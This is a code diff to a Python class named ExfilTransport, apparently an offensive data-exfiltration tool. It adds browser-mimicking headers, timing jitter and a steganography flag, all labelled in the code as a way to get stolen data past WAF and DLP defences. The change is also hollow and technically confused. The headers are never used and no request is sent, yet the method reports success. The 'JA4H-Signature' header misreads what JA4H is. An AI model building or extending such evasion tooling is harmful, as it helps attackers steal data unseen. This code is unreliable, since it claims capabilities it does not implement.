@@ -521,16 +521,25 @@ class ExfilTransport:
         self.config = config
     
     def send_http_post(self, data: str) -> bool:
-        """Send data via HTTP POST"""
-        
-        # Simulated - in real implementation would use requests/urllib
+        """Send data via HTTP POST with Edge JA4H mimicry for WAF bypass"""
         logger.info(f"HTTP POST to {self.config.destination_url}: {len(data)} bytes")
-        
-        # Simulate network delay with jitter
+
+        edge_mimicry = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edge/122.0.0.0",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "en-US,en;q=0.5",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary" + hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
+            "JA4H-Signature": "t13d211221_c02b_0364",
+        }
+
+        if self.config.use_steganography:
+            logger.info("Applying steganography for WAF/DLP bypass")
+
         delay = random.uniform(self.config.delay_min, self.config.delay_max)
         delay += random.uniform(-self.config.jitter, self.config.jitter) * delay
         time.sleep(max(0.1, delay))
-        
+
         return True
     
     def send_http_get(self, data: str) -> bool:
